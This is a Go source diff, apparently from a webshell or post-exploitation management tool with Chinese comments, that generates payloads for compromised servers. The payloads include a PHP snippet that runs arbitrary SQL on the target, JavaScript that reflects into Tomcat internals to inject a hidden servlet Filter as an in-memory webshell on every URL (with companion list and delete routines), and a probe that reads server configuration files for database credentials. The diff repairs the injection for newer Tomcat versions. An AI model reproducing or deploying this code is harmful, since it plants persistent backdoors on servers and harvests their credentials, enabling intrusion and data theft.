@@ -65,7 +65,7 @@ func phpDBExec(p ExtParams) string {
 		"        $rows = $st->fetchAll(PDO::FETCH_ASSOC);\n"+
 		"        $cols = count($rows) ? array_keys($rows[0]) : [];\n"+
 		"        echo json_encode(['ok' => true, 'columns' => $cols, 'rows' => $rows]);\n"+
-		"    } else { echo json_encode(['ok' => true, 'columns' => [], 'rows' => [], 'affected' => $pdo->rowCount()]); }\n"+
+		"    } else { echo json_encode(['ok' => true, 'columns' => [], 'rows' => [], 'affected' => $st->rowCount()]); }\n"+
 		"} catch (Exception $e) { echo json_encode(['ok' => false, 'error' => $e->getMessage()]); }\n"+
 		"echo \""+EndMarker+"\";\n",
 		"@CONN@", b64s(conn), "@SQL@", b64s(p.SQL))
@@ -249,17 +249,16 @@ var fname = new java.lang.String(Base64.getDecoder().decode("@FN@"));
 var ghdr = new java.lang.String(Base64.getDecoder().decode("@GH@"));
 var gval = new java.lang.String(Base64.getDecoder().decode("@GV@"));
 function findCtx(req) {
-    var f = req.getClass().getDeclaredField("request");
-    f.setAccessible(true);
-    var inner = f.get(req);
-    var m = inner.getClass().getDeclaredMethod("getContext", null);
-    m.setAccessible(true);
-    return m.invoke(inner, null);
+    var sci = req.getServletContext();
+    var f1 = sci.getClass().getDeclaredField("context");
+    f1.setAccessible(true);
+    var appCtx = f1.get(sci);
+    var f2 = appCtx.getClass().getDeclaredField("context");
+    f2.setAccessible(true);
+    return f2.get(appCtx);
 }
 try {
-    var ctx = findCtx(request);
-    var sci = ctx.getClass().getMethod("getServletContext", null).invoke(ctx, null);
-    var stdCtx = sci.getClass().getMethod("getContext", null).invoke(sci, null);
+    var stdCtx = findCtx(request);
     var Filter = javax.servlet.Filter;
     var filterImpl = new Filter({
         init: function(cfg) {},
@@ -283,16 +282,16 @@ try {
         },
         destroy: function() {}
     });
-    var FilterDef = java.lang.Class.forName("org.apache.catalina.deploy.FilterDef");
+    var FilterDef = java.lang.Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
     var fd = FilterDef.newInstance();
     fd.setFilterName(fname);
     fd.setFilterClass(filterImpl.getClass().getName());
     fd.setFilter(filterImpl);
     stdCtx.addFilterDef(fd);
-    var FilterMap = java.lang.Class.forName("org.apache.catalina.deploy.FilterMap");
+    var FilterMap = java.lang.Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
     var fm = FilterMap.newInstance();
     fm.setFilterName(fname);
-    fm.setURLPattern("/*");
+    fm.addURLPattern("/*");
     fm.setDispatcher("REQUEST");
     stdCtx.addFilterMapBefore(fm);
     var cfgCls = java.lang.Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
@@ -314,23 +313,22 @@ print("`+EndMarker+`");`,
 // jspMemshellList 枚举 StandardContext 已注册的 FilterDef/FilterMap/servletMaps。
 func jspMemshellList(_ ExtParams) string {
 	return `function findCtx(req) {
-    var f = req.getClass().getDeclaredField("request");
-    f.setAccessible(true);
-    var inner = f.get(req);
-    var m = inner.getClass().getDeclaredMethod("getContext", null);
-    m.setAccessible(true);
-    return m.invoke(inner, null);
+    var sci = req.getServletContext();
+    var f1 = sci.getClass().getDeclaredField("context");
+    f1.setAccessible(true);
+    var appCtx = f1.get(sci);
+    var f2 = appCtx.getClass().getDeclaredField("context");
+    f2.setAccessible(true);
+    return f2.get(appCtx);
 }
 try {
-    var ctx = findCtx(request);
-    var sci = ctx.getClass().getMethod("getServletContext", null).invoke(ctx, null);
-    var stdCtx = sci.getClass().getMethod("getContext", null).invoke(sci, null);
+    var stdCtx = findCtx(request);
     var out = {filters: [], maps: []};
     var fd = stdCtx.findFilterDefs();
     for (var i = 0; i < fd.length; i++) out.filters.push({name: String(fd[i].getFilterName()), cls: String(fd[i].getFilterClass())});
     var fms = stdCtx.findFilterMaps();
     for (var j = 0; j < fms.length; j++) {
-        var pats = fms[j].findURLPatterns();
+        var pats = fms[j].getURLPatterns();
         out.maps.push({name: String(fms[j].getFilterName()), patterns: pats ? String(java.util.Arrays.toString(pats)) : ""});
     }
     print(JSON.stringify(out));
@@ -345,17 +343,16 @@ func jspMemshellDel(p ExtParams) string {
 	return build(`var Base64 = java.util.Base64;
 var fname = new java.lang.String(Base64.getDecoder().decode("@FN@"));
 function findCtx(req) {
-    var f = req.getClass().getDeclaredField("request");
-    f.setAccessible(true);
-    var inner = f.get(req);
-    var m = inner.getClass().getDeclaredMethod("getContext", null);
-    m.setAccessible(true);
-    return m.invoke(inner, null);
+    var sci = req.getServletContext();
+    var f1 = sci.getClass().getDeclaredField("context");
+    f1.setAccessible(true);
+    var appCtx = f1.get(sci);
+    var f2 = appCtx.getClass().getDeclaredField("context");
+    f2.setAccessible(true);
+    return f2.get(appCtx);
 }
 try {
-    var ctx = findCtx(request);
-    var sci = ctx.getClass().getMethod("getServletContext", null).invoke(ctx, null);
-    var stdCtx = sci.getClass().getMethod("getContext", null).invoke(sci, null);
+    var stdCtx = findCtx(request);
     var removed = [];
     var fms = stdCtx.findFilterMaps();
     for (var i = 0; i < fms.length; i++) {
@@ -389,7 +386,7 @@ func jspServletList(_ ExtParams) string {
     while (fs.hasNext()) {
         var fk = String(fs.next());
         var fr = application.getFilterRegistration(fk);
-        out.filters.push({name: fk, cls: String(fr.getClassName()), patterns: String(java.util.Arrays.toString(fr.getUrlPatternRestrictions ? [] : fr.getUrlPatterns().toArray()))});
+        try { out.filters.push({name: fk, cls: String(fr.getClassName()), patterns: String(java.util.Arrays.toString(fr.getUrlPatterns().toArray()))}); } catch (e2) { out.filters.push({name: fk, cls: String(fr.getClassName()), patterns: ""}); }
     }
     print(JSON.stringify(out));
 } catch (e) {
@@ -515,7 +512,7 @@ func phpDBProbe() string {
 
 // jspDBProbe 读常见 Java 配置找 jdbc 连接。
 func jspDBProbe() string {
-	return `var roots = [application.getRealPath("/"), System.getProperty("user.dir")];
+	return `var roots = [application.getRealPath("/"), java.lang.System.getProperty("user.dir")];
 var files = ["WEB-INF/classes/application.properties", "WEB-INF/classes/application.yml",
              "WEB-INF/web.xml", "conf/server.xml", "config/application.properties"];
 var found = [];
